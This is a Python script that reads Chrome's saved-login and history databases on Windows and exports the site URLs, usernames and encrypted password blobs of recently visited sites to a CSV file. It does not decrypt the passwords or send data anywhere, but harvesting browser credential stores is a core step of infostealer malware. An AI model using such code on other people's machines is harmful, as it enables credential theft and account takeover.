import os
import sqlite3
import csv
import shutil
import datetime
from urllib.parse import urlparse

def chrome_time_to_datetime(chrome_time):
    """Convert Chrome time (microseconds since 1601-01-01) to datetime."""
    try:
        if chrome_time and chrome_time > 0:
            epoch_start = datetime.datetime(1601, 1, 1)
            return epoch_start + datetime.timedelta(microseconds=chrome_time)
    except Exception as e:
        print(f"[TIME CONVERSION ERROR] {e}")
    return None

def domain_from_url(url):
    """Extract domain name from URL."""
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return ""

def export_logins(chrome_user_data, profile="Default", output_csv="chrome_encrypted_logins_clean.csv"):
    login_db = os.path.join(chrome_user_data, profile, "Login Data")
    history_db = os.path.join(chrome_user_data, profile, "History")

    # Copy DBs so Chrome lock doesn't interfere
    temp_login_db = login_db + ".temp"
    temp_history_db = history_db + ".temp"
    shutil.copy2(login_db, temp_login_db)
    shutil.copy2(history_db, temp_history_db)

    login_conn = sqlite3.connect(temp_login_db)
    login_cursor = login_conn.cursor()

    history_conn = sqlite3.connect(temp_history_db)
    history_cursor = history_conn.cursor()

    # Sort by most recently used logins
    login_cursor.execute("""
        SELECT origin_url, username_value, password_value, date_last_used 
        FROM logins 
        ORDER BY date_last_used DESC
    """)

    seen_domains = set()

    cutoff_time = datetime.datetime.utcnow() - datetime.timedelta(days=14)

    with open(output_csv, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["origin_url", "username", "encrypted_password", "last_visit", "visit_count"])

        for row in login_cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            last_used = row[3]

            if not username:
                continue  # skip logins without username

            domain = domain_from_url(origin_url)
            if not domain or domain in seen_domains:
                continue  # skip duplicates or invalid URLs

            seen_domains.add(domain)

            # Match history by domain
            history_cursor.execute("""
                SELECT last_visit_time, visit_count 
                FROM urls 
                WHERE url LIKE ?
                ORDER BY last_visit_time DESC LIMIT 1
            """, ('%' + domain + '%',))

            history_row = history_cursor.fetchone()

            if history_row:
                last_visit_dt = chrome_time_to_datetime(history_row[0])
                if not last_visit_dt:
                    continue  # skip if last_visit is invalid

                if last_visit_dt < cutoff_time:
                    continue  # skip if last visit is older than 2 weeks

                last_visit = last_visit_dt
                visit_count = history_row[1]
            else:
                continue  # skip if no history match

            writer.writerow([
                origin_url,
                username,
                encrypted_password.hex() if encrypted_password else "",
                last_visit.isoformat(),
                visit_count
            ])

    login_conn.close()
    history_conn.close()
    os.remove(temp_login_db)
    os.remove(temp_history_db)

if __name__ == "__main__":
    chrome_user_data = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data")
    output_csv = "chrome_encrypted_logins_clean.csv"
    export_logins(chrome_user_data, profile="Default", output_csv=output_csv)
    print(f"Cleaned encrypted logins exported to {output_csv}")
